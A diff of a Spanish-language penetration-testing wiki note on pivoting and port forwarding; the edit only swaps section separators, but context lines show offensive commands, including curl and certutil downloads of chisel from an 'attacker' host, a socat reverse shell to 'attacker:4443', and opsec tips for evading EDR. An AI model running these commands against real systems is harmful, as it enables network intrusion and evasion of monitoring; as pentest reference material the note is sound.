@@ -32,7 +32,7 @@ linked:
 ---
 # Pivoting & Port Forwarding
 
-***
+---
 
 ## Overview
 
@@ -49,7 +49,7 @@ Preferencia operativa:
 3. **SOCKS via C2 / meterpreter** si ya hay implant activo.
 4. **DNS / ICMP tunneling** último recurso (lento, detectable).
 
-***
+---
 
 ## SSH port forwarding
 
@@ -114,7 +114,7 @@ DNS también:
 sshuttle --dns -r user@pivot 10.10.20.0/24
 ```
 
-***
+---
 
 ## chisel
 
@@ -164,7 +164,7 @@ curl http://attacker/chisel -o /tmp/chisel && chmod +x /tmp/chisel
 # Windows: certutil -urlcache -split -f http://attacker/chisel.exe chisel.exe
 ```
 
-***
+---
 
 ## ligolo-ng
 
@@ -205,7 +205,7 @@ nxc smb 10.10.20.0/24
 ligolo » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
 ```
 
-***
+---
 
 ## socat
 
@@ -232,7 +232,7 @@ socat OPENSSL:attacker:4443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,san
 socat TCP-LISTEN:8053,fork UDP:internal-dns:53
 ```
 
-***
+---
 
 ## netsh (Windows nativo)
 
@@ -256,7 +256,7 @@ Firewall rule si hace falta:
 netsh advfirewall firewall add rule name="fwd8080" dir=in action=allow protocol=TCP localport=8080
 ```
 
-***
+---
 
 ## Metasploit pivot
 
@@ -288,7 +288,7 @@ meterpreter > portfwd flush
 
 Ver [[Metasploit Framework]].
 
-***
+---
 
 ## DNS / ICMP tunneling (último recurso)
 
@@ -317,7 +317,7 @@ ssh -p 8000 user@localhost
 
 Detectable con cualquier IDS que mire payloads de echo. Solo si TCP/UDP egress está bloqueado.
 
-***
+---
 
 ## Reconocimiento desde el pivote
 
@@ -345,7 +345,7 @@ Windows desde memoria (Invoke-*):
 Invoke-Portscan -Hosts 10.10.20.1-254 -Ports "21,22,80,443,445,3389"
 ```
 
-***
+---
 
 ## Checklist por tipo de acceso
 
@@ -359,7 +359,7 @@ Invoke-Portscan -Hosts 10.10.20.1-254 -Ports "21,22,80,443,445,3389"
 | Sólo egress DNS | iodine / dnscat2 |
 | Sólo egress ICMP | ptunnel / icmpsh |
 
-***
+---
 
 ## Opsec
 
@@ -369,7 +369,7 @@ Invoke-Portscan -Hosts 10.10.20.1-254 -Ports "21,22,80,443,445,3389"
 - Netsh portproxy sobrevive reboots; borrar al salir.
 - Ligolo TUN names: renombrar lejos de `ligolo` si hay EDR mirando interfaces.
 
-***
+---
 
 ## Referencias
 
